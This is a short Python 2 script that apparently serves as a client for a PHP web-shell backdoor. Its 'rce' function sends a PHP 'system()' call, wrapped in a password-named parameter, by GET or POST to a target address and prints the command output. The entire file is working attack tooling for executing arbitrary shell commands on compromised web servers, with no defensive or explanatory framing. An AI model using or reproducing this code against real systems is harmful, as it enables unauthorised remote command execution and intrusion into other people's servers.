import requests

def rce(address,command,password,method):
	if method == 'get':
		print "*******************************************************" 
		try:
			data = {password:"system('"+command+"');"}
			r = requests.get(address,params=data)
			if r.text != '':
				print address,":"
				print r.text
				print "*******************************************************" 
		except:
			print "Rce Failed."
			print "*******************************************************" 
	if method == 'post':
		print "*******************************************************" 
		try:
			data = {password:"system('"+command+"');"}
			r = requests.post(address,data=data)
			if r.text != '':
				print address,":"
				print r.text
				print "*******************************************************" 
		except:
			print "Rce Failed."
			print "*******************************************************" 